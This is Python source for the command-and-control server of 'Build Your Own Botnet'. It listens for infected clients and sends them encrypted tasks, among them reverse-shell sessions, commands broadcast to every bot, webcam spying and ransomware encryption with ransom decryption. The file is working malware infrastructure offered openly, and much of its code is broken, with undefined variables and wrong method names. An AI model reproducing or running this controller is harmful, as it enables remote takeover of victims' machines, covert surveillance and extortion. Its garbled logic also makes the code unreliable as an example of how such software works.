#!/usr/bin/python
"""
Build Your Own Botnet
github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library 
import os
import sys
import json
import time
import Queue
import pickle
import socket
import struct
import base64
import random
import logging
import requests
import colorama
import argparse
import datetime
import functools
import cStringIO
import threading
import subprocess
import collections

# external
import cv2
import numpy
import configparser
import SocketServer
import mysql.connector

# cryptography 
import Crypto.Util
import Crypto.Cipher.AES
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP

# byob 
from modules import crypto, database, util


class ServerError(Exception):
    pass


class ClientHandlerError(Exception):
    pass


class Server(threading.Thread):

    def __init__(self, port=1337, debug=True, **kwargs):
        """
        Server (Build Your Own Botnet)
        """
        super(Server, self).__init__()
        self.clients            = {}
        self.current_client     = None
        self.config             = self._get_config()
        self.database           = self._get_database()
        self.commands           = self._get_commands()
        self._socket            = self._get_socket()
        self._text_color        = util.color()
        self._text_style        = colorama.Style.DIM
        self._prompt_color      = colorama.Fore.RESET
        self._prompt_style      = colorama.Style.BRIGHT
        self._lock              = threading.Lock()
        self._active            = threading.Event()
        self._name              = time.time()
        self._prompt            = None
        self._abort             = False
        self._debug             = debug
        self._count             = 1
        self._commands          = {
            'exit'          :   self.quit,
            'help'          :   self.help,
            'quit'          :   self.quit,
            'settings'      :   self.settings,
            'back'          :   self.background_client,
            'client'        :   self.client_shell,
            'sessions'      :   self.list_sessions,
            'kill'          :   self.remove_client,
            'ransom'        :   self.client_ransom,
            'sendall'	    :   self.task_broadcast,
            'webcam'        :   self.client_webcam,
            'debug'         :   self.debug,
            'db'            :   self.database.command
            }


    def _server_prompt(self, data):
        with self._lock:
            return raw_input(self._prompt_color + self._prompt_style + '\n' + bytes(data).rstrip())


    def _error(self, data):
        util.debug(str(data))
        if self.current_client:
            with self.current_client._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
        else:
            with self._lock:
                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')


    def _print(self, info):
        lock = self._lock if not self.current_client else self.current_client._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        if len(str(info.get(key))) > 80:
                            info[key] = str(info.get(key))[:77] + '...'
                        info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
        else:
            with lock:
                print("Server method {} received invalid input ({}): '{}'".format(self._print.func_name, type(info), repr(info)))


    def _return(self, data=None):
        if not self.current_client:
            with self._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self._prompt, end="")
        else:
            with self.current_client._lock:
                if data:
                    print('\n' + data + '\n')
                else:
                    print(self.current_client.prompt, end="")

    def _get_config(self):
        config = configparser.ConfigParser()
        for path in [os.path.abspath(i) for i in os.listdir('.') + os.listdir('..') + os.listdir('resources') if i.endswith('.ini')]:
            if 'config' in path:
                config.read(path)
                break
        else:
            raise byobError("missing configuration file 'config.ini'")
        return config


    def _get_socket(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(10)
            return s
        except Exception as e:
            self._server_error(str(e))


    def _get_database(self):
        try:
            print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + colorama.Style.BRIGHT + __doc__ + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.1'))
            print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + " [?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
            db = None
            if self.config.has_section('database'):
                try:
                    tasks = []
                    if self.config.has_section('tasks'):
                        tasks = [k for k,v in self.config['tasks'].items() if v]
                    db = Database(tasks=tasks, **self.config['database'])
                    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
                except:
                    max_v = max(map(len, self.config['database'].values())) + 2
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + " [-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
            else:
                try:
                    db = Database()
                except:
                    max_v = max(map(len, self.config['database'].values())) + 2
                    print(colorama.Fore.RED + colorama.Style.BRIGHT + " [-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
            return db
        except Exception as e:
            return "{} error: {}".format(self._get_session.func_name, str(e))


    def _get_client(self, client_id):
        if str(client_id).isdigit() and int(client_id) in self.clients:
            client = self.clients[int(client_id)]
        elif self.current_client:
            client = self.current_client
        else:
            self._error("Invalid Client ID")
        return client


    def _get_clients(self):
        return [v for v in self.clients.values()]


    def _get_api(self, task):
        if isinstance(task, dict) and 'request' in task:
            request = task.get('request')
            section, _, option = request.partition(' ')
            if server.config.has_section(section):
                if server.config[section].has_option(option):
                    result = server.config[section].get(option)
                    task.update({'result' : result})
                    output = self._encrypt(json.dumps(task), client.session_key)
                    connection.sendall(struct.pack('L', len(output)) + output)
                else:
                    self._return("%s error: invalid API request ('%s')" % (self._handle_request.func_name, option))
            else:
                self._return("%s error: invalid request type ('%s')" % (self._handle_request.func_name, section))
        else:
            self._return("%s warning: invalid input type (expected {}, receieved {})" % (self._handle_request.func_name, dict, type(task)))


    @util.threaded
    def _connection_handler(self, sock=None):
        if not sock:
            sock = self._socket
        while True:
            conn, addr = sock.accept()
            client  = ClientHandler(connection=conn, name=self._count, server=self)
            self.clients[self._count] = client
            self._count  += 1
            client.start()                        
            if not self.current_client:
                print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()), end="")
            else:
                if self.current_client._prompt:
                    print(str(self.current_client._prompt) % int(self.current_client._name), end="")


    def _encrypt(self, data, key):
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        output = b''.join((cipher.nonce, tag, ciphertext))
        return base64.b64encode(output)


    def _decrypt(self, data, key):
        data = cStringIO.StringIO(base64.b64decode(data))
        nonce, tag, ciphertext = [data.read(x) for x in (Crypto.Cipher.AES.block_size-1, Crypto.Cipher.AES.block_size, -1)]
        cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
        try:
            return cipher.decrypt_and_verify(ciphertext, tag)
        except:
            return cipher.decrypt(ciphertext) + '\n(Authentication check failed - either the decryption key is wrong or the message was tampered with)\n'


    def debugger(self, raw_python_code):
        if self._debug:
            try:
                return eval(raw_python_code)
            except Exception as e:
                return "Error: %s" % str(e)
        else:
            return "Debugging mode: disabled"


    def quit(self):
        if self._server_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
            for client in self._get_clients():
                client._active.set()
                self.send_task('passive', client._name)
        self._abort = True
        self._active.clear()
        print(colorama.Fore.RESET + colorama.Style.NORMAL)
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os._name is 'nt' else "kill -9 {}".format(os.getpid())).read()
        print('Exiting...')
        sys.exit(0)


    def help(self, info=None):
        column1 = 'command <arg>'
        column2 ='description'
        info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
        max_key = max(map(len, info.keys() + [column1])) + 2
        max_val = max(map(len, info.values() + [column2])) + 2
        print('\n' + self._text_color + colorama.Style.BRIGHT + column1.center(max_key) + column2.center(max_val))
        for key in sorted(info):
            print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))


    def display(self, info):
        print('\n')
        if isinstance(info, dict):
            if len(info):
                self._print(json.dumps(info))
        elif isinstance(info, list):
            if len(info):
                for data in info:
                    print(self._text_color + colorama.Style.BRIGHT + '  %d\n' % int(info.index(data) + 1), end="")
                    self._print(data)
        elif isinstance(info, str):
            try:
                self._print(json.loads(info))
            except:
                print(self._text_color + self._text_style + str(info))
        else:
            self._server_error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))


    def settings(self, args=None):
        if not args:
            try:
                text_color   = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._text_color][0]
                text_style   = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._text_style][0]
                prompt_color = [color for i in [getattr(c.Fore, color) for color in ['BLUE','CYAN','RED','BLACK','MAGENTA','GREEN']] if i == self._prompt_color][0]
                prompt_style = [style for i in [getattr(c.Style, style) for style in ['DIM','BRIGHT','NORMAL']] if i == self._prompt_style][0]
            except Exception as e:
                return '{} error: {}'.format(self.settings.func_name, str(e))
            print("\n")
            print(colorama.Fore.RESET + colorama.Style.BRIGHT + "Settings".center(40))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'text color/style: {}'.format(' '.join(text_color, text_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'prompt color/style: {}'.format(' '.join(prompt_color, prompt_style).center(40)))
            print(colorama.Fore.RESET + colorama.Style.DIM + 'debug: {}'.format('true' if self._debug else 'false'))
            print(self._text_color + self._text_style)
        else:
            target, _, options = args.partition(' ')
            setting, _, option = options.partition(' ')
            option = option.upper()
            print(self._text_color + self._text_style)
            if target == 'prompt':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings prompt color [value]\ncolors:   white/black/red/yellow/green/cyan/magenta")
                    self._prompt_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                    self._prompt_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                else:
                    print("usage: settings prompt <option> [value]")
            elif target == 'text':
                if setting == 'color':
                    if not hasattr(colorama.Fore, option):
                        print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                    self._text_color = getattr(colorama.Fore, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)
                elif setting == 'style':
                    if not hasattr(colorama.Style, option):
                        print("usage: settings text style [value]\nstyles:     bright/normal/dim")
                    self._text_style = getattr(colorama.Style, option)
                    print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                else:
                    print("usage: settings text <option> [value]")
            elif target == 'debug':
                if setting.lower() in ('true', 'on'):
                    self._debug = True
                elif settings.lower() in ('false', 'off'):
                    self._debug = False
                else:
                    print("usage: settings debug <on/off> (or true/false)")
            else:
                print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')


    def send_task(self, command, client_id=None):
        client = self._get_client_from_id(client_id)
        if client:
            try:
                task    = {'client': client.info['id'], 'session': client.session, 'command': command}
                task_id = self.database.new_task(task)
                data    = self._encrypt(json.dumps(task), client.session_key)
                sock.sendall(struct.pack("L", len(data))+data)
                client._connection.sendall(data)
            except Exception as e:
                time.sleep(1)
                self._server_error(str(e))


    def recv_task(self, client_id=None, connection=None):
        if client_id:
            if str(client_id).isdigit() and int(client_id) in self.clients:
                client      = self.clients[int(client_id)]
                connection  = self.clients[int(client_id)]._connection
            elif self.current_client:
                client      = self.current_client
                connection  = self.current_client._connection
            else:
                self._server_error("Invalid Client ID: {}".format(client_id))
        if connection:
            try:
                header_size = struct.calc_size("L")
                header = connection.recv(header_size)
                msg_size = struct.unpack("L", header)[0]
                msg = ""
                while len(msg) < msg_size:
                    msg += connection.recv(1)
                if msg:
                    try:
                        data = self._decrypt(msg, client.session_key)
                        try:
                            return json.loads(data)
                        except:
                            return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(data)}
                    except:
                        pass
                return {'task': 'None', 'client': client.info['id'], 'session': client.session, 'command': 'error', 'result': str(buf)}
            except Exception as e:
                self._server_error("{} error: {}".format(self.recv_task.func_name, str(e)))
                time.sleep(1)
                client._active.clear()
                self.remove_client(client._name)
                self._active.set()
                self.run()


    def task_broadcast(self, msg):
        for client in self._get_clients():
            try:
                self.send_task(msg, client._name)
            except Exception as e:
                self._server_error('{} returned error: {}'.format(self.task_broadcast.func_name, str(e)))


    def background_client(self, client_id=None):
        if not client_id:
            if self.current_client:
                self.current_client._active.clear()
        elif str(client_id).isdigit() and int(client_id) in self.clients:
                self.clients[int(client_id)]._active.clear()
        self.current_client = None
        self._active.set()


    def remove_client(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            return
        else:
            try:
                client = self.clients[int(client_id)]
                client._active.clear()
                self.send_task('kill', client_id)
                try:
                    client._connection.close()
                except: pass
                try:
                    client._connection.shutdown()
                except: pass
                _ = self.clients.pop(int(client_id), None)
                del _
                print(self._text_color + self._text_style)
                if not self.current_client:
                    with self._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.set()
                    client._active.clear()
                    return self.run()
                elif int(client_id) == self.current_client._name:
                    with self.current_client._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.clear()
                    self.current_client._active.set()
                    return self.current_client.run()
                else:
                    with self._lock:
                        print('Client {} disconnected'.format(client_id))
                    self._active.clear()
                    self.current_client._active.set()
                    return self.current_client.run()
            except Exception as e:
                self._server_error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))


    def list_clients(self, args=None):
        args    = str(args).split()
        verbose = bool('-v' in args or '--verbose' in args)
        online  = bool('-a' not in args or '--all' not in args)
        lock    = self._lock if not self.current_client else self.current_client._lock
        with lock:
            print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format('Session ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('IP Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n----------------------------------------------------------------------------------------------')
            clients = self.database.get_clients(online=online, verbose=verbose)
            for k, v in clients.items():
                print(self._text_color + colorama.Style.BRIGHT + '{:>3}'.format(k) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.info['id']) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>33}'.format(v.session) + colorama.Fore.YELLOW  + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format(v._connection.getpeername()[0]))
            print('\n')


    def client_webcam(self, args=''):
        try:
            if not self.current_client:
                self._server_error( "No client selected")
                return
            client = self.current_client
            result = ''
            mode, _, arg = args.partition(' ')
            client._active.clear()
            if not mode or str(mode).lower() == 'stream':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                retries = 5
                while retries > 0:
                    try:
                        port = random.randint(6000,9999)
                        s.bind(('0.0.0.0', port))
                        s.listen(1)
                        cmd = 'webcam stream {}'.format(port)
                        self.send_task(cmd, client._name)
                        conn, addr  = s.accept()
                        break
                    except:
                        retries -= 1
                header_size = struct.calcsize("L")
                window_name = addr[0]
                cv2._namedWindow(window_name)
                data = ""
                try:
                    while True:
                        while len(data) < header_size:
                            data += conn.recv(4096)
                        packed_msg_size = data[:header_size]
                        data = data[header_size:]
                        msg_size = struct.unpack("L", packed_msg_size)[0]
                        while len(data) < msg_size:
                            data += conn.recv(4096)
                        frame_data = data[:msg_size]
                        data = data[msg_size:]
                        frame = pickle.loads(frame_data)
                        cv2.imshow(window_name, frame)
                        key = cv2.waitKey(70)
                        if key == 32:
                            break
                finally:
                    conn.close()
                    cv2.destroyAllWindows()
                    result = 'Webcam stream ended'
            else:
                self.send_task("webcam %s" % args, client._name)
                task    = self.recv_task(client._name)
                result  = task.get('result')
            self.display(result)
        except Exception as e:
            self._server_error("webcam stream failed with error: {}".format(str(e)))


    def client_ransom(self, args=None):
        if self.current_client:
            if 'decrypt' in str(args):
                self.send_task("ransom decrypt %s" % key.exportKey(), self.current_client._name)
            else:
                self.send_task("ransom %s" % args, self.current_client._name)
                return
        else:
            self._server_error("No client selected")


    def client_shell(self, client_id):
        if not str(client_id).isdigit() or int(client_id) not in self.clients:
            self._server_error("Client '{}' does not exist".format(client_id))
        else:
            self._active.clear()
            if self.current_client:
                self.current_client._active.clear()
            client = self.clients[int(client_id)]
            self.current_client = client
            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client._name, client._connection.getpeername()[0]) + self._text_color + self._text_style)
            self.current_client._active.set()
            return self.current_client.run()


    def run(self):
        self._active.set()
        while True:
            try:
                self._active.wait()
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd()
                cmd_buffer   = self._server_prompt(self._prompt)
                if cmd_buffer:
                    output = ''
                    cmd, _, action  = cmd_buffer.partition(' ')
                    if cmd in self._commands:
                        try:
                            output  = self._commands[cmd](action) if len(action) else self._commands[cmd]()
                        except Exception as e1:
                            output  = str(e1)
                    elif cmd == 'cd':
                        os.chdir(action)
                    else:
                        try:
                            output = subprocess.check_output(cmd_buffer, shell=True)
                        except: pass
                    if output:
                        self.display(str(output))
                if self._abort:
                    break
            except KeyboardInterrupt:
                break
        print('Server shutting down')
        sys.exit(0)


class ClientHandler(threading.Thread):

    _prompt = None

    def __init__(self, server=None, connection=None, name=None, lock=None):
        """
        ClientHandler: wrapper for handling a client connection
            kwargs:
                server       byob.server.Server instance that is managing clients
                connection   socket with active connection
                lock         threading.Lock object shared between all clients
        """
        super(ClientHandler, self).__init__()
        self._server        = kwargs.get('server')
        self._connection    = kwargs.get('connection')
        self._lock          = kwargs.get('lock')
        self._active        = threading.Event()
        self.session_key    = self._session_key()
        self.info           = self._info()
        self.session        = self._session()
        self._connection.setblocking(True)


    def _error(self, data):
        with self._lock:
            print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self._name) + bytes(data) + '\n')


    def _kill(self):
        self._active.clear()
        self._server.remove_client(self._name)
        self._server.current_client = None
        self._server._active.set()
        self._server.run()


    def _info(self):
        buf  = ''
        while '\n' not in buf:
            buf += self._connection.recv(1024)
        text = server._decrypt(buf.rstrip(), self.session_key)
        data = json.loads(text.rstrip())
        info = self.database.handle_client(data)
        return info


    def _session_key(self):
        try:
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            g  = 2
            Ax = pow(g, a, p)
            self._connection.send(Crypto.Util.number.long_to_bytes(Ax))
            Bx = Crypto.Util.number.bytes_to_long(self._connection.recv(256))
            k  = pow(Bx, a, p)
            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(k)).hexdigest()
        except Exception as e:
            self._error("{} error: {}".format(self._session_key, str(e)))
            self._kill()


    def _session(self):
        try:
            session_id  = Crypto.Hash.MD5.new(json.dumps(self.info.get('id')) + str(int(time.time()))).hexdigest()
            ciphertext  = server._encrypt(session_id, self.session_key)
            self._connection.sendall(ciphertext + '\n')
            values      = [session_id, self.info.get('id'), self.session_key]
            server.database_procedure('sp_addSession', values)
            return session_id
        except Exception as e2:
            self._error(str(e2))


    def prompt(self, data):
        with self._lock:
            return raw_input(server._prompt_color + server._prompt_style + '\n' + bytes(data).rstrip())


    def status(self):
        try:
            c = time.time() - float(self._created)
            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
            return ', '.join([i for i in data if i])
        except Exception as e:
            return "{} error: {}".format(self._get_status.func_name, str(e))


    def run(self):
        while True:
            try:
                if self._active.wait():
                    task = self._server.recv_task(self._name) if not self._prompt else self._prompt
                    print(str(task))
                    if 'help' in task.get('command'):
                        self._active.clear()
                        self._server.help(task.get('result'))
                        self._active.set()

                    elif 'passive' in task.get('command'):
                        self._server._print(task.get('result'))
                        break

                    elif 'prompt' in task.get('command'):
                        self._prompt = task
                        command = self.prompt(task.get('result') % int(self._name))
                        cmd, _, action  = command.partition(' ')
                        if cmd in ('\n', ' ', ''):
                            continue
                        elif cmd in self._server.commands and cmd != 'help':
                            result = self._server.commands[cmd](action) if len(action) else self._server.commands[cmd]()
                            if result:
                                self._server._print(result)
                                self._server.database.save_task(task)
                            continue
                        else:
                            self._server.send_task(command, self._name)
                    else:
                        if task.get('result') and task.get('result') != 'None':
                            self._server._print(task.get('result'))
                            self._server.database.save_task(task)
                    if self._server._abort:
                        break
                    self.prompt = None
            except Exception as e:
                self._error(str(e))
                time.sleep(1)
                break
        self._server._return()


def main():
    parser = argparse.ArgumentParser(prog='server.py', description="BYOB (Build Your Own Botnet) Command & Control Server", version='0.4.7')
    parser.add_argument('-p','--port', type=int, default=1337, action='store', help='port for the server to listen on')
    parser.add_argument('--debug', action='store_true', default=False, help='enable debugging mode')
    try:
        options = parser.parse_args()
        byob_server  = Server(port=options.port, config='config.ini', debug=options.debug)
        byob_server.start()
    except Exception as e:
        print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
        parser.print_help()
        sys.exit(0)


if __name__ == '__main__':
    colorama.init(autoreset=True)
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(name)15s %(submodule)15s %(message)s')
    main()
